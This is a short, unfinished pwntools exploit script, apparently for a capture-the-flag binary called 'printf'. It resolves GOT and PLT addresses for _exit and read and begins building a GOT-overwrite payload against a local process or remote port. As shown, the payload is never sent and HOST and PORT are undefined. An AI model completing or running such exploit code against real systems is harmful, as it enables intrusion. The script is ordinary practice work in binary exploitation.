from pwn import *
import struct
import time


libc = ELF('libc.so')
elf = ELF('printf')
#p = process('./printf')
#p = remote('127.0.0.1', 10003)
plt_exit = elf.symbols['_exit']
got_exit = elf.got['_exit']
got_read = elf.got['read']

got_base=   0x000000004f78
plt_base=   0x000000001020
#gotexit =   0x000000004f90 me la da bien
exit_got=   0x000000004f90
libc_start= 0x7ffff7dedb6b
read =      0x7ffff7ed3f81 

def exploit(r):

    context.log_level ="error"

    print("[DBG] GOT_READ= ",hex(got_read))
    print("[DBG] GOT_EXIT= ",hex(got_exit))
    print("[DBG] PLT_EXIT= ",hex(plt_exit))
    print("[+] HI, WHATS YOUR NAME ",r.recvline())#whats your name? 	###ok
    payload=""
    payload+=  p64(got_exit)
    #print("hex(got_exit: )",hex(payload))

    print("[*] Enviando entrada 1 ")#hi, WRITE 3  #####   HI,      %%%%%%%%%%
    r.send("\x00\x00")
    r. recv(1000)


if __name__ == "__main__":
    
    if len(sys.argv) >1:
        r=remote(HOST,PORT)
        exploit(r)
    else:
        r=process("./printf")
        print (util.proc.pidof(r))
        pause()
        exploit(r)